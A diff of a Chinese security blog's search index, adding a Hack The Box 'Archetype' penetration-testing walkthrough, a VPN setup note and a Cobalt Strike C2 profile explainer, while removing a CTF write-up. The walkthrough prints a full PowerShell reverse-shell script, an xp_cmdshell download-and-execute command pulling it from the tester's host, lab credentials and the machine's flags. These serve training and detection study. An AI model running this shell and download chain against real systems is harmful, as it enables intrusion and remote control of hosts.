class="number">16158503998777337192674807945908821386693302597406387444349699542598095897285692091211476083809918750897861769264465663579793991679314429752295361957446059739359063103544638030154853387212724326557655148019702164400877330186327609348721648084613268414555203577183573889217351893673924371072333289354228674760315294504839359655489521012677566131327841053678744664608889174603997019849103346541029516404589134950647019313518381914869229067797614481107128126689730344210547636672896855115883318917823168989617075675281028751941660136853501327782175932311318584187206520215509966133929719351504589815606927966176149195779</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">8141444293590939926339140123606008320647283862734921035349993152736573212703175057344759120176139012159033736316173682242298057686577598027916977530077029856485627175379314811877501994761319423200265287785759453820095015807444949214265244900640835658881784054368646315441712319010363526404565445161985028402390954712866106921908734210919493250702187032275110124875570931002934221972634821225056433936935859313342958691599902102787445475305941582660308223893978598257522846759968671416599167447071747751521028177865487587852125772706197522666828868692341809398348371017535491453879955859658955741930595458023438100360</span>, <span class="string">&quot;e&quot;</span>: <span class="number">3</span>, <span class="string">&quot;n&quot;</span>: <span class="number">32317006071311007300714876688669951960444102669715484032130345427525853843244805988476588891865958825360448605290048592734632332583370763153757718383572299749209540231288997719992234568181178226221179583987114390330645720300200969658014581064237644699938356963972432409945268139827411216302358245968648685631852162149417921884611499140034180764281310426002777325893540359517405108625457448469440495488988134588122686723870538630903173922667307922091719215351000831684798921623126319342120005518066740737893055076255035167681805650095125693219744392056464805973406041558289941338164246139243161281441192654245812544809</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">32186692144821382556216414197036084450002406028322550030603281663242416068106078282460625499374288627277856236842632516201785581944392028997860442197688447471167439623993997293924922369564496861634056297046007484347428266405265850123438755524763475428402354354249708937585215741306623413807430961934859288170402397120084830356448790691150552044932030386388033322020053166574933222485614505111408006503260110878032569297769908686840698298294276083052356237977129947951638366162505197545851558874564120929824886880546857109477962821888212631753191393081515047983305638857450728393479191251293759249543719567211830591890</span>, <span class="string">&quot;e&quot;</span>: <span class="number">3</span>, <span class="string">&quot;n&quot;</span>: <span class="number">32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891768950486750990609730626074204953069170365351039844202147563211921699195999562457720327836338730130880314152322204629124008956222526289905774520564846695102147923912430235289375056683956240708354173616548191256839933106531936657610976268878493644409501763510589523424550621212340120772084161285303618671573000124518317607283263174664732027</span>&#125;]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> session <span class="keyword">in</span> sessions:</span><br><span class="line">    e=session[<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">    n=session[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">    msg=session[<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">    data += [(msg, n)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Please wait, performing CRT&quot;</span>)</span><br><span class="line">x, n = chinese_remainder_theorem(data)</span><br><span class="line">e=session[<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">realnum = gmpy.iroot(x,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(realnum)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>根据上图扫描结果，靶机开放了135、139、445、1433端口</p>
+<ul>
+<li><p>135端口为RPC，可以进行口令爆破</p>
+</li>
+<li><p>139端口为NetBIOS</p>
+</li>
+<li><p>445端口为SMB文件共享</p>
+</li>
+<li><p>1433端口与SQL服务有关</p>
+</li>
+</ul>
+<h3 id="445端口SMB文件共享"><a href="#445端口SMB文件共享" class="headerlink" title="445端口SMB文件共享"></a>445端口SMB文件共享</h3><p>先查看SMB的共享文件</p>
+<p><code>smbclient -L 10.10.10.27</code></p>
+<a href="/images/20210313204721.png" class="gallery-item"><img src="/images/20210313204721.png" style="zoom:67%;" /></a>
 
-<p>得到最终结果</p>
-<p>134491505866050799518149049116410640504801097393689986282578875171467764060356652949245541838134430726585819015055443577486765212620027434842249657064471879286694101508916323731138545953360768175582990398279608814586282578875171467764060356652949245541838134430727023319615912208504801097393689986282578875</p>
-<p><strong>根据Crypto第二题ez_crypto下flag取后9位的提示，得到flag为</strong></p>
-<p>flag{282578875}</p>
-<p><del>很离谱吗？是的，很离谱，更离谱的是ez_cypto怎么算都是m&#x3D;512347890123，尝试提交flag几十遍都是错的</del></p>
-<h2 id="Unsolved-Problem"><a href="#Unsolved-Problem" class="headerlink" title="Unsolved Problem"></a>Unsolved Problem</h2><h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x05-misc2"><a href="#0x05-misc2" class="headerlink" title="0x05 misc2"></a>0x05 misc2</h4><p>图种格式，拆分为png+2*rar，png内容”secret is here”，rar内容5characters.txt加密</p>
-<p>png：</p>
-<p>没有找出更多隐写相关的线索</p>
-<p>5characters.txt：</p>
-<p>推测解压密码为5位字符，爆破时间需要2天多，放弃；内容为13位，推测为flag{XXXXXXX}，CRC32绕过需要7位，放弃</p>
-<h3 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="0x06-base"><a href="#0x06-base" class="headerlink" title="0x06 base"></a>0x06 base</h4><p>hint.txt内容为16，推测为base16</p>
-<p>base.txt内容为brainfuck加密和3538，解密之后为base和3538，将3538用base16（十六进制）解密后为58，合起来内容为base58，这是一种bitcoin的编码方式</p>
-<p>然后没了，试了一堆都试不出来</p>
-<h4 id="0x07-ez-cypto"><a href="#0x07-ez-cypto" class="headerlink" title="0x07 ez_cypto"></a>0x07 ez_cypto</h4><p>挺离谱的，RSA共模攻击，求出m&#x3D;512347890123，提示flag为后9位，我也挺想知道flag是啥的</p>
+<p>smb要求输入密码，但是直接按回车之后，也可以看到共享列表</p>
+<p>在图中可以看到backups为共享的对象为全体，直接访问backups文件夹</p>
+<p><code>smbclient //10.10.10.27/backups</code></p>
+<p>回车</p>
+<p>然后用<code>ls</code>查看backups文件内容</p>
+<p>用<code>get</code>获取prod.dtsConfig文件</p>
+<a href="/images/20210313205904.png" class="gallery-item"><img src="/images/20210313205904.png" style="zoom: 67%;" /></a>
+
+<p>prod.dtsConfig文件就下载到了我们服务器中</p>
+<a href="/images/20210313212722.png" class="gallery-item"><img src="/images/20210313212722.png" style="zoom:67%;" /></a>
+
+<p>在prod.dtsConfig文件中，可以找sql的User ID和Password</p>
+<p>SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证</p>
+<p>这里的参数值是操作系统身份验证方式，ARCHETYPE为主机名，sql_svc为登录数据库的操作系统用户名</p>
+<h3 id="mssqlclient登入数据库执行脚本"><a href="#mssqlclient登入数据库执行脚本" class="headerlink" title="mssqlclient登入数据库执行脚本"></a>mssqlclient登入数据库执行脚本</h3><p>这边需要下载impacket工具</p>
+<p><code>git clone https://github.com/SecureAuthCorp/impacket</code></p>
+<p><code>cd impacket</code></p>
+<p><code>python3 setup.py install</code></p>
+<p>然后利用mssqlclient和获取到的账号密码登入数据库</p>
+<p><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
+<p><code>M3g4c0rp123</code></p>
+<a href="/images/Lily_Screenshot_1615812452.png" class="gallery-item"><img src="/images/Lily_Screenshot_1615812452.png" style="zoom:67%;" /></a>
+
+<p>登入成功之后，我们需要测试一下该账号是否具有最高的sysadmin权限</p>
+<p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></p>
+<a href="/images/image-20210315205958962.png" class="gallery-item"><img src="/images/image-20210315205958962.png" style="zoom: 67%;" /></a>
+
+<p>结果显示，该账号确实具有sysadmin的权限，接下来启用xp_cmdshell获得RCE并反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;Show Advanced Options&#x27;, 1; </span><br><span class="line">reconfigure; </span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其中执行whoami的结果显示如下</p>
+<a href="/images/image-20210315213821244.png" class="gallery-item"><img src="/images/image-20210315213821244.png" style="zoom:67%;" /></a>
+
+<p>说明该账户在SQL服务中具有archetype\sql_svc，但是在host上不具有任何权限</p>
+<p>创建一个shell.ps1脚本，内容如下</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.xx.xx.x&quot;</span>,xxx);<span class="variable">$stream</span> =<span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">065535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> =<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> |<span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> =([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
+
+<p>查一下本地ip地址</p>
+<p><code>ifconfig tun0</code></p>
+<p>得知本机在局域网内的ip为10.10.16.10</p>
+<p>修改shell.ps1脚本内ip内容为10.10.16.10，端口为443</p>
+<p>然后在shell.ps1脚本存在的文件夹下运行http服务，因为80端口有服务运行，选择在81端口上运行</p>
+<p><code>python3 -m http.server 81</code></p>
+<p>然后去另一个窗口运行nc，等待10.10.10.27的连接</p>
+<p><code>nc -nlvp 443</code></p>
+<p>接下来进sql窗口执行下列命令</p>
+<p><code>xp_cmdshell &quot;Powershell &quot; IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.10:81/shell.ps1\&quot;);&quot;</code></p>
+<p>在http和nc窗口同时得到反馈</p>
+<p><a href="/images/image-20210413221428797.png" class="gallery-item"><img src="/images/image-20210413221428797.png"></a></p>
+<p>在<code>\user\sql_svc\desktop</code>下获取user.txt</p>
+<a href="/images/image-20210413214419239.png" class="gallery-item"><img src="/images/image-20210413214419239.png" style="zoom:67%;" /></a>
+
+<p>得到user flag <code>3e7b102e78218e935bf3f4951fec21a3</code></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>前面得到的只是普通用户的账号，接下来可以通过type指令查看Powershell的历史记录文件</p>
+<p><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
+<p><a href="/images/image-20210413215004497.png" class="gallery-item"><img src="/images/image-20210413215004497.png"></a></p>
+<p>这表示backups对管理员账号进行了映射，我们可以用psexec.py来取得管理员权限</p>
+<p>接下来用管理员账号<code>administrator</code>和密码<code>MEGACORP_4dm1n!!</code>进行登入</p>
+<p><a href="/images/image-20210413221145501.png" class="gallery-item"><img src="/images/image-20210413221145501.png"></a></p>
+<p>进入到管理员桌面，取得root.txt</p>
+<a href="/images/image-20210413215944832.png" class="gallery-item"><img src="/images/image-20210413215944832.png" style="zoom:50%;" /></a>
+
+<p>提交flag<code>b91ccec3305e98240082d4474b848528</code>，完成Archetype机器</p>
 </div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
         var options = {
             selector: '.gallery-item'
@@ -368,13 +199,198 @@
         lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
         }</script>]]></content>
       <categories>
-        <category>CTF</category>
+        <category>HTB</category>
         <category>Hacker</category>
         <category>Security</category>
+        <category>Penetration testing</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>NeSE</tag>
+        <tag>Study life</tag>
+        <tag>HTB</tag>
+        <tag>Penetration testing</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB VPN配置</title>
+    <url>/2021/03/13/HTB-VPN%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h3 id="HTB-VPN配置"><a href="#HTB-VPN配置" class="headerlink" title="HTB VPN配置"></a>HTB VPN配置</h3><p>服务器： 阿里云 ubuntu</p>
+<p>在服务器安装openvpn</p>
+<p><code>apt-get update</code></p>
+<p><code>apt-get install openvpn</code></p>
+<p>在HTB的Labs页面中找到连接Starting Point</p>
+<p><a href="/images/20210313190126.png" class="gallery-item"><img src="/images/20210313190126.png"></a></p>
+<p>选择好其中一个节点进行下载.ovpn文件</p>
+<a href="/images/20210313185138.png" class="gallery-item"><img src="/images/20210313185138.png" style="zoom:50%;" /></a>
+
+<p>在服务器用openvpn连接到staring point</p>
+<p><code>openvpn starting_point_XXXXX.ovpn</code></p>
+<p>点击Archetype机器，选择Jion Machine，加入之后会告诉你该机器的IP地址</p>
+<a href="/images/20210313185915.png" class="gallery-item"><img src="/images/20210313185915.png" style="zoom: 50%;" /></a>
+
+<p>在服务器ping该地址，可以ping通</p>
+<a href="/images/20210313190251.png" class="gallery-item"><img src="/images/20210313190251.png" style="zoom:50%;" /></a>
+
+<p>测试VPN已经搭建完成</p>
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>]]></content>
+      <categories>
+        <category>HTB</category>
+        <category>Hacker</category>
+        <category>Security</category>
+        <category>Penetration testing</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>HTB</tag>
+        <tag>Penetration testing</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CobaltStrike配置文件详解</title>
+    <url>/2022/09/14/CobaltStrike%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="CobaltStrike配置文件详解"><a href="#CobaltStrike配置文件详解" class="headerlink" title="CobaltStrike配置文件详解"></a>CobaltStrike配置文件详解</h1><p>Cobalt Strike使用配置文件中存在的值来生成beacon payload，用户创建配置文件，并使用可扩展命令和C2配置文件语言来设置值。配置文件指定beacon将如何在事件中改变和存储数据。</p>
+<p>在配置文件中，选项分为全局选项和局部选项。全局选项更新全局 Beacon 设置，而本地选项是特定于事件的。一个事件中的本地选项更改不会影响其他事件的输出。</p>
+<p>配置文件分为多个部分，规定 C2 通信不同部分的值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># this is a comment</span><br><span class="line">set global_option &quot;value&quot;;</span><br><span class="line"> </span><br><span class="line">protocol-transaction &#123;</span><br><span class="line">     set local_option &quot;value&quot;;</span><br><span class="line"> </span><br><span class="line">     client &#123;</span><br><span class="line">          # customize client indicators</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     server &#123;</span><br><span class="line">          # customize server indicators</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h2><p>全局选项对于 C2 通信来说是全局的。睡眠时间和时间抖动等选项定义了 Beacon 与团队服务器通信的频率。以下是一些带有示例值的全局选项的列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set sample_name &quot;Profile Name&quot;;</span><br><span class="line">set sleeptime &quot;30000&quot;;</span><br><span class="line">set jitter    &quot;20&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&quot;;</span><br><span class="line">set host_stage &quot;false&quot;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482842">Cobalt Strike 用户指南</a></p>
+</blockquote>
+<h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><p>另一方面，本地选项的范围仅限于每个事件。一项事件的选项不会影响另一项事件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set uri &quot;URI_For HTTP transaction&quot;;</span><br><span class="line">set verb &quot;POST&quot;;</span><br><span class="line">set uri_x86 &quot;StagetURI_for_x86&quot;;</span><br><span class="line">set uri_x64 &quot;StagetURI_for_x64&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>除了这些选项之外，配置文件还可以指定不同的协议来执行不同的操作。以下是示例以及对其用法的简要说明：</p>
+<ul>
+<li><p>http-stager: Beacon 是一个分阶段的有效负载。stager 下载文件并将其注入内存。此事件中列出的值正在自定义用于下载信标的 HTTP 通信。</p>
+</li>
+<li><p>dns-beacon: 在 Cobalt Strike v4.3 之后，DNS 选项成为dns-beacon事件的一部分。此事件修改 DNS C2 通信。</p>
+<blockquote>
+<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_dns-beacons.htm#_Toc65482850">Cobalt Strike 用户指南</a>。</p>
+</blockquote>
+</li>
+<li><p>http-get： http -get事件自定义 Beacon 和团队服务器之间的 HTTP 通信。Beacon 首先发送 HTTP 请求，其中包含有关受感染系统的元数据。如果团队服务器有任务要执行，服务器会发送一个 HTTP 响应。</p>
+</li>
+<li><p>http**-**post：一旦 Beacon 执行服务器发送的任务，任务的输出就会在http-post事件中传输。当任务输出发送到服务器时，此事件中列出的值会影响 HTTP 通信。</p>
+</li>
+<li><p>https-certificate：如果 Beacon 的任务是通过 HTTPS 进行通信，则团队服务器会生成一个自签名证书。团队服务器使用http-get和http-post事件值来创建实际的 HTTP 请求和响应。此配置文件事件可以帮助指定 SSL 证书的不同参数。</p>
+<blockquote>
+<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_self-signed-ssl-certificates.htm#_Toc65482846">Cobalt Strike 用户指南。</a></p>
+</blockquote>
+</li>
+</ul>
+<p><a href="/images/word-image-32.png" title="图 1. Cobalt Strike 默认配置文件" class="gallery-item"><img src="/images/word-image-32.png" alt="图 1. Cobalt Strike 默认配置文件"></a></p>
+<p>图 1. Cobalt Strike 默认配置文件</p>
+<h2 id="Cobalt-Strike-默认配置文件"><a href="#Cobalt-Strike-默认配置文件" class="headerlink" title="Cobalt Strike 默认配置文件"></a>Cobalt Strike 默认配置文件</h2><p>如果未指定其他自定义配置文件，则将加载默认配置文件。上面的图 1 是默认配置文件的规范，下面的图 2 是使用 Cobalt Strike 团队服务器中的网络驱动下载选项从默认配置文件捕获流量的示例。</p>
+<p><a href="/images/word-image-33.png" title="图 2. 从默认配置文件中捕获的示例流量" class="gallery-item"><img src="/images/word-image-33.png" alt="图 2. 从默认配置文件中捕获的示例流量"></a></p>
+<p>从图 2 中，您可以看到有几个 GET 和 POST 请求和响应的 HTTP 事务。</p>
+<ul>
+<li>对于 GET 请求，大多数请求 URI 都非常短并且具有预定义的模式。URI 是从图 1 中默认配置文件的set uri下指定的 URI 列表中随机选择的（完整列表请参见下表 1）。如果恶意攻击者使用在http-get部分中设置 uri选项的自定义配置文件，他们可以轻松地将 URI 修改为任意字符串。这也解释了为什么基于模式的签名可以很好地使用默认配置文件捕获 Cobalt Strike 流量，但无法使用自定义配置文件捕获任何变化。</li>
+<li>对于 POST 请求，URI 中有一个预定义的模式 - &#x2F;submit.php?id&#x3D;。ID 值是随机生成的。与 HTTP GET 请求的可能性类似，如果恶意攻击者在http-post部分使用带有set uri选项的自定义配置文件，他们可以轻松地将 URI 修改为任意字符串。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Index</th>
+<th>URIs</th>
+<th>Index</th>
+<th>URIs</th>
+<th>Index</th>
+<th>URIs</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>&#x2F;ca</td>
+<td>8</td>
+<td>&#x2F;fwlink</td>
+<td>15</td>
+<td>&#x2F;push</td>
+</tr>
+<tr>
+<td>2</td>
+<td>&#x2F;dpixel</td>
+<td>9</td>
+<td>&#x2F;cm</td>
+<td>16</td>
+<td>&#x2F;ptj</td>
+</tr>
+<tr>
+<td>3</td>
+<td>&#x2F;__utm.gif</td>
+<td>10</td>
+<td>&#x2F;cx</td>
+<td>17</td>
+<td>&#x2F;j.ad</td>
+</tr>
+<tr>
+<td>4</td>
+<td>&#x2F;pixel.gif</td>
+<td>11</td>
+<td>&#x2F;pixel</td>
+<td>18</td>
+<td>&#x2F;ga.js</td>
+</tr>
+<tr>
+<td>5</td>
+<td>&#x2F;g.pixel</td>
+<td>12</td>
+<td>&#x2F;match</td>
+<td>19</td>
+<td>&#x2F;en_US&#x2F;all.js</td>
+</tr>
+<tr>
+<td>6</td>
+<td>&#x2F;dot.gif</td>
+<td>13</td>
+<td>&#x2F;visit.js</td>
+<td>20</td>
+<td>&#x2F;activity</td>
+</tr>
+<tr>
+<td>7</td>
+<td>&#x2F;updates.rss</td>
+<td>14</td>
+<td>&#x2F;load</td>
+<td>21</td>
+<td>&#x2F;IE9CompatViewList.xml</td>
+</tr>
+</tbody></table>
+<p>表 1. Cobalt Strike 默认配置文件中指定的可能 URI</p>
+<h2 id="定制的-Cobalt-Strike-Profile"><a href="#定制的-Cobalt-Strike-Profile" class="headerlink" title="定制的 Cobalt Strike Profile"></a>定制的 Cobalt Strike Profile</h2><p>Public Malleable C2 配置文件可以在公共存储库中下载，例如<a href="https://github.com/rsmudge/Malleable-C2-Profiles">GitHub </a>的官方配置文件示例。这些配置文件可以由团队服务器加载并用作 C2 通信的信标下载。</p>
+<h3 id="全局选项"><a href="#全局选项" class="headerlink" title="全局选项"></a>全局选项</h3><ul>
+<li>sleeptime：信标响应的睡眠时间为 5000 毫秒 (5s)。</li>
+<li>Jitter：设置%的时间抖动为0。在本例中，由于jitter值为0，Beacon会每隔5s回调一次。</li>
+<li>Maxdns：通过 DNS 上传数据时，主机名的最大长度为 255。</li>
+<li>UserAgent：将 HTTP C2请求用户代理设置为”Mozilla&#x2F;5.0(compatible; MSIE 8.0;Windows NT 6.1;Trident&#x2F;5.0)”</li>
+</ul>
+<p><a href="/images/word-image-34.png" title="图 3. Etumbot 配置文件中的全局选项" class="gallery-item"><img src="/images/word-image-34.png" alt="图 3. Etumbot 配置文件中的全局选项"></a></p>
+<h3 id="信标通过-HTTP-GET-请求从-teamserver获取任务"><a href="#信标通过-HTTP-GET-请求从-teamserver获取任务" class="headerlink" title="信标通过 HTTP GET 请求从 teamserver获取任务"></a>信标通过 HTTP GET 请求从 teamserver获取任务</h3><p>在全局选项下方，我们可以找到以下关于 HTTP 请求和响应的选项配置。下面的图 4 和图 5 显示了这种配置，其中包括客户端和服务器的 URI、标头和元数据信息。</p>
+<p>红色框突出显示了示例 Malleable C2 配置文件中的 HTTP 请求 URI、HTTP 请求标头、元数据编码算法、URI 中附加的元数据、HTTP 响应标头、加密和编码为响应正文的任务数据。</p>
+<p><a href="/images/word-image-35.png" title="图 4. Etumbot 配置文件中的 HTTP GET 请求选项" class="gallery-item"><img src="/images/word-image-35.png" alt="图 4. Etumbot 配置文件中的 HTTP GET 请求选项"></a></p>
+<p><a href="/images/word-image-36.png" title="图 5. 实时流量中的 HTTP GET 请求" class="gallery-item"><img src="/images/word-image-36.png" alt="图 5. 实时流量中的 HTTP GET 请求"></a></p>
+<h3 id="Beacon-通过-HTTP-POST-请求将任务执行结果提交到-teamserver"><a href="#Beacon-通过-HTTP-POST-请求将任务执行结果提交到-teamserver" class="headerlink" title="Beacon 通过 HTTP POST 请求将任务执行结果提交到 teamserver"></a>Beacon 通过 HTTP POST 请求将任务执行结果提交到 teamserver</h3><p>我们可以从下面的图 6 中找到以下关于 HTTP 响应的选项配置，以及图 7 中 POST C2 流量的样子。</p>
+<p>红色框突出显示了示例可扩展 C2 配置文件中的 HTTP 请求 URI、HTTP 请求标头、附加在 URI 中的 HTTP 请求 sessionID、用于命令执行结果的 HTTP 请求有效负载、HTTP 响应标头和 HTTP 响应正文。</p>
+<p><a href="/images/word-image-37.png" title="图 6. Etumbot 配置文件中的 HTTP POST 请求选项" class="gallery-item"><img src="/images/word-image-37.png" alt="图 6. Etumbot 配置文件中的 HTTP POST 请求选项"></a></p>
+<p>红色框突出显示了可扩展 C2 配置文件示例中的 HTTP URI 路径、Netbios 编码的会话 ID、HTTP URI 路径后缀、HTTP 请求标头、HTTP 请求 UA、Base64 编码的任务执行结果和 HTTP 响应标头。<a href="/images/word-image-38.png" title="图 7. 实时流量中的 HTTP POST 请求选项" class="gallery-item"><img src="/images/word-image-38.png" alt="图 7. 实时流量中的 HTTP POST 请求选项"></a></p>
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>]]></content>
+      <categories>
+        <category>Traffic Analysis</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>Traffic Analysis</tag>
       </tags>
   </entry>
   <entry>
@@ -446,95 +462,60 @@
         <category>Penetration testing</category>
       </categories>
       <tags>
-        <tag>HTB</tag>
         <tag>Study life</tag>
+        <tag>HTB</tag>
         <tag>Penetration testing</tag>
       </tags>
   </entry>
   <entry>
-    <title>Linux服务器利用V2ray访问外网（命令行）</title>
-    <url>/2021/12/10/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%A9%E7%94%A8V2ray%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%EF%BC%88%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%89/</url>
-    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Linux服务器利用V2ray访问外网（命令行）"><a href="#Linux服务器利用V2ray访问外网（命令行）" class="headerlink" title="Linux服务器利用V2ray访问外网（命令行）"></a>Linux服务器利用V2ray访问外网（命令行）</h2><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>在用go-cqhttp+flask框架实现自定义QQ机器人功能时，想要利用爬虫获取TG机器人的相关发布内容，面临的首个问题就是服务器需要访问外网。</p>
